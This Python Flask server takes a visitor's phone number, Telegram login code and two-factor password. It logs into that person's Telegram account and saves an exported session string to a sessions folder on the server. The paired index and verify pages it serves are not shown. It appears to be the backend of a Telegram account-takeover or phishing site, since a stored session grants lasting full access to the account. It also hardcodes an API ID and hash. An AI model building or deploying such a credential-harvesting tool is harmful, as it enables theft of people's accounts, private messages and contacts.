import os
import asyncio
import threading
import traceback
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
from pyrogram import Client
from pyrogram.errors import (
    SessionPasswordNeeded,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    PasswordHashInvalid
)

app = Flask(__name__)
CORS(app)

# নিরাপত্তার জন্য API_ID এবং API_HASH এনভায়রনমেন্ট ভেরিয়েবলে রাখা ভালো
API_ID = int(os.environ.get("API_ID", 33511945))
API_HASH = os.environ.get("API_HASH", "d044392a17690c14ee5b4a23651a0700")

# একটিভ ক্লায়েন্ট মেমোরিতে ধরে রাখার ডিকশনারি
active_clients = {}

# ব্যাকগ্রাউন্ডে একটি স্থায়ী Event Loop তৈরি ও চালু করা
bg_loop = asyncio.new_event_loop()

def start_background_loop(loop):
    asyncio.set_event_loop(loop)
    loop.run_forever()

loop_thread = threading.Thread(target=start_background_loop, args=(bg_loop,), daemon=True)
loop_thread.start()

def run_async(coro):
    """স্থায়ী ব্যাকগ্রাউন্ড লুপে যেকোনো async ফাংশন চালানোর হেল্পার"""
    future = asyncio.run_coroutine_threadsafe(coro, bg_loop)
    return future.result()


@app.route('/', methods=['GET'])
def home():
    if os.path.exists('index.html'):
        return send_file('index.html')
    return "index.html not found", 404


@app.route('/verify', methods=['GET'])
def verify_page():
    if os.path.exists('verify.html'):
        return send_file('verify.html')
    return "verify.html not found", 404


@app.route('/send-code', methods=['POST'])
def send_code():
    data = request.get_json(silent=True) or {}
    phone = str(data.get('phone', '')).strip()

    if not phone:
        return jsonify({"status": "error", "message": "Phone number is required"}), 400

    try:
        session_name = f"session_{phone.replace('+', '')}"

        async def _send():
            # আগে থেকে কোনো অর্ধসমাপ্ত ক্লায়েন্ট থাকলে ডিসকানেক্ট করা
            if phone in active_clients:
                try:
                    await active_clients[phone]["client"].disconnect()
                except Exception:
                    pass

            client = Client(
                session_name,
                api_id=API_ID,
                api_hash=API_HASH,
                in_memory=True
            )
            await client.connect()
            sent_code = await client.send_code(phone)

            active_clients[phone] = {
                "client": client,
                "phone_code_hash": sent_code.phone_code_hash
            }
            return sent_code.phone_code_hash

        phone_code_hash = run_async(_send())

        return jsonify({
            "status": "success",
            "message": "OTP code sent to Telegram!",
            "phone_code_hash": phone_code_hash
        })
    except Exception as e:
        print("SEND CODE ERROR:", traceback.format_exc())
        return jsonify({"status": "error", "message": str(e)}), 400


@app.route('/verify-code', methods=['POST'])
def verify_code():
    data = request.get_json(silent=True) or {}
    phone = str(data.get('phone', '')).strip()
    code = str(data.get('code', '')).strip()
    password = data.get('password')

    if not phone or not code:
        return jsonify({"status": "error", "message": "Phone and Code are required"}), 400

    if phone not in active_clients:
        return jsonify({"status": "error", "message": "Session expired or please request code again."}), 400

    client_data = active_clients[phone]
    client = client_data["client"]
    phone_code_hash = client_data["phone_code_hash"]

    try:
        async def _verify():
            try:
                await client.sign_in(phone, phone_code_hash, code)
            except SessionPasswordNeeded:
                if not password:
                    return {"status": "2fa_required"}
                await client.check_password(str(password))

            session_string = await client.export_session_string()

            os.makedirs("sessions", exist_ok=True)
            session_filename = f"sessions/{phone.replace('+', '')}.txt"
            with open(session_filename, "w", encoding="utf-8") as f:
                f.write(session_string)

            await client.disconnect()
            return {"status": "success"}

        res = run_async(_verify())

        if res and res.get("status") == "2fa_required":
            return jsonify({"status": "2fa_required", "message": "2FA Password required"})

        active_clients.pop(phone, None)
        return jsonify({"status": "success", "message": "Session generated successfully!"})

    except PhoneCodeInvalid:
        return jsonify({"status": "error", "message": "Invalid OTP code!"}), 400
    except PhoneCodeExpired:
        active_clients.pop(phone, None)
        return jsonify({"status": "error", "message": "OTP code has expired!"}), 400
    except PasswordHashInvalid:
        return jsonify({"status": "error", "message": "Incorrect 2FA Password!"}), 400
    except Exception as e:
        print("VERIFY ERROR DETAILS:", traceback.format_exc())
        return jsonify({"status": "error", "message": str(e)}), 400


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    # threaded=True থাকলে ব্যাকগ্রাউন্ড লুপের সাথে নির্বিঘ্নে কাজ করবে
    app.run(host='0.0.0.0', port=port, threaded=True)
